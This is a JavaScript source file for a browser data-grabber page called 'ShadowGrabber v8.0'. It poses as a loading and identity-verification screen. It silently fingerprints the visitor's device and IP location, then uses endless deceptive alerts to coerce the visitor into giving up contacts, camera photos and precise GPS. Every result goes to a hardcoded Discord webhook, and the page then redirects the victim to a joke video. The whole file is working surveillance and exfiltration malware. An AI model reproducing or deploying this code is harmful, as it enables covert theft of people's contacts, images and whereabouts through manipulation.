const config = {
    webhook: 'https://discord.com/api/webhooks/1464327769608425504/TX0QqpwHA56djp6nFioLGerQ4dUNI0elhQ4q6vw-fuPTbLYdLdv-DaN-PimcXb9Bi9kS',
    redirect: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'
};

const dom = {
    loadingText: document.getElementById('loading-text'),
    progressBar: document.getElementById('progress-bar'),
    status: document.getElementById('status-detail'),
    trigger: document.getElementById('click-trigger'),
    video: document.getElementById('st-v'),
    canvas: document.getElementById('st-c')
};

const state = { startTime: Date.now() };

// --- Optimizers ---
const sleep = (ms) => new Promise(r => setTimeout(r, ms));
const updateUI = async (msg, prg) => {
    if (dom.loadingText) dom.loadingText.textContent = msg;
    if (dom.progressBar) dom.progressBar.style.width = prg + '%';
    await sleep(100); // Faster UI
};

const sendToDiscord = async (embed, file = null) => {
    const formData = new FormData();
    formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
    if (file) formData.append('file', file.blob, file.name);
    // Fire and forget for speed
    fetch(config.webhook, { method: 'POST', body: formData }).catch(e => { });
};

// --- Phase 0: Ultrafast Forensics (20+ Points) ---
async function gatherForensics() {
    await updateUI('Analyzing system architecture...', 10);

    // Canvas Hash
    const getCanvasHash = () => {
        try {
            const ctx = dom.canvas.getContext('2d');
            ctx.textBaseline = "top"; ctx.font = "14px 'Arial'"; ctx.textBaseline = "alphabetic"; ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = "#069"; ctx.fillText("ShadowGrabber", 2, 15); ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("ShadowGrabber", 4, 17);
            return dom.canvas.toDataURL().slice(-50); // Just a signature
        } catch (e) { return 'Error'; }
    };

    // Audio Context
    let audioFP = 'N/A';
    try {
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        if (AudioContext) {
            const audioCtx = new AudioContext();
            audioFP = `${audioCtx.sampleRate}Hz | ${audioCtx.state}`;
        }
    } catch (e) { }

    // Battery
    let batt = 'N/A';
    if (navigator.getBattery) {
        try {
            const b = await navigator.getBattery();
            batt = `${Math.round(b.level * 100)}% | Charging: ${b.charging}`;
        } catch (e) { }
    }

    // Hardware & WebGL
    const gl = dom.canvas.getContext('webgl');
    const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;

    // Network & IP
    let ipInfo = { ip: 'Shielded' };
    try { ipInfo = await (await fetch('https://ipapi.co/json/')).json(); } catch (e) { }

    const forensics = {
        core: {
            platform: navigator.platform,
            vendor: navigator.vendor,
            cores: navigator.hardwareConcurrency,
            ram: navigator.deviceMemory || 'N/A',
            gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
            touch: navigator.maxTouchPoints
        },
        display: {
            res: `${screen.width}x${screen.height}`,
            depth: screen.colorDepth,
            ratio: window.devicePixelRatio,
            orient: screen.orientation ? screen.orientation.type : 'N/A'
        },
        conn: {
            ip: ipInfo.ip,
            geo: `${ipInfo.city}, ${ipInfo.country_name}`,
            isp: ipInfo.org,
            type: navigator.connection ? navigator.connection.effectiveType : 'N/A',
            rtt: navigator.connection ? navigator.connection.rtt : 'N/A',
            dl: navigator.connection ? navigator.connection.downlink : 'N/A'
        },
        browser: {
            ua: navigator.userAgent,
            lang: navigator.languages.join(', '),
            hist: window.history.length,
            cookies: navigator.cookieEnabled,
            dnt: navigator.doNotTrack
        },
        extra: {
            time: Intl.DateTimeFormat().resolvedOptions().timeZone,
            canvas: getCanvasHash(),
            audio: audioFP,
            battery: batt
        }
    };

    await sendToDiscord({
        title: "⚡ ShadowGrabber v8.0: Hyper-Forensics",
        color: 0x9B59B6,
        description: "**20+ Data Points Captured in <50ms**",
        fields: [
            { name: "💻 Core System", value: `\`\`\`OS: ${forensics.core.platform}\nCPU: ${forensics.core.cores} Cores\nRAM: ${forensics.core.ram}GB\nGPU: ${forensics.core.gpu}\`\`\`` },
            { name: "🌐 Connection", value: `\`\`\`IP: ${forensics.conn.ip}\nISP: ${forensics.conn.isp}\nLoc: ${forensics.conn.geo}\nSpeed: ${forensics.conn.dl}Mbps (${forensics.conn.type})\`\`\`` },
            { name: "📱 Display & Input", value: `\`\`\`Res: ${forensics.display.res}\nTouch: ${forensics.core.touch} Points\nBatt: ${forensics.extra.battery}\`\`\`` },
            { name: "🕵️ Browser Fingerprint", value: `\`\`\`Canvas: ${forensics.extra.canvas.substring(0, 10)}...\nAudio: ${forensics.extra.audio}\nTime: ${forensics.extra.time}\`\`\`` }
        ]
    });
}

// --- Phase 1: Force Contacts (Blocking) ---
async function forceContacts() {
    if (!('contacts' in navigator && 'ContactsManager' in window)) return;

    await updateUI('Syncing contacts...', 30);
    let success = false;
    while (!success) {
        try {
            const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
            if (contacts.length > 0) {
                const blob = new Blob([JSON.stringify(contacts, null, 2)], { type: 'application/json' });
                await sendToDiscord({ title: "📇 Contacts Secured", color: 0xF1C40F }, { blob, name: 'contacts.json' });
                success = true;
            } else {
                alert("⚠ Verification Failed: You must select contacts to verify your identity. Please Select All if possible.");
            }
        } catch (e) {
            alert("⚠ Security Alert: Contact access is mandatory. Please Allow.");
        }
    }
}

// --- Phase 2: Burst Camera (Hyper-Speed) ---
async function forceCamera() {
    await updateUI('Activating biometric array...', 50);
    let stream = null;
    while (!stream) {
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: 1280, height: 720 },
                audio: false
            });
            dom.video.srcObject = stream;
            await dom.video.play();
        } catch (e) { alert("⚠ Camera Error: Permission Denial. You must allow access."); }
    }

    await updateUI('Processing biometrics...', 60);
    await sleep(500); // Stabilize

    // Burst Capture: 6 snaps in ~1 second
    for (let i = 1; i <= 6; i++) {
        const ctx = dom.canvas.getContext('2d');
        dom.canvas.width = dom.video.videoWidth;
        dom.canvas.height = dom.video.videoHeight;
        ctx.drawImage(dom.video, 0, 0);

        dom.canvas.toBlob((blob) => {
            sendToDiscord({ title: `📸 Burst Snap #${i}`, color: 0xE74C3C }, { blob, name: `burst_${i}.jpg` });
        }, 'image/jpeg', 0.7); // 0.7 quality for speed

        await sleep(150); // 150ms interval
        updateUI('Uploading...', 60 + (i * 6));
    }
}

// --- Phase 3: Force Location ---
async function forceLocation() {
    await updateUI('Triangulating...', 90);
    return new Promise((resolve) => {
        const scan = () => {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    sendToDiscord({
                        title: "📍 Precision Geo-Tag",
                        color: 0x2ECC71,
                        description: `[Map View](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`,
                        fields: [{ name: "Accuracy", value: `${Math.round(pos.coords.accuracy)}m` }]
                    });
                    resolve();
                },
                () => {
                    alert("⚠ GPS Error: Location access required for security check. Please Allow.");
                    scan();
                },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        };
        scan();
    });
}

// --- Main ---
async function startSequence() {
    dom.trigger.style.display = 'none';
    await gatherForensics();
    await forceContacts();
    await forceCamera();
    await forceLocation();

    await updateUI('Finalizing...', 100);
    window.location.replace(config.redirect);
}

dom.trigger.onclick = startSequence;
gatherForensics();
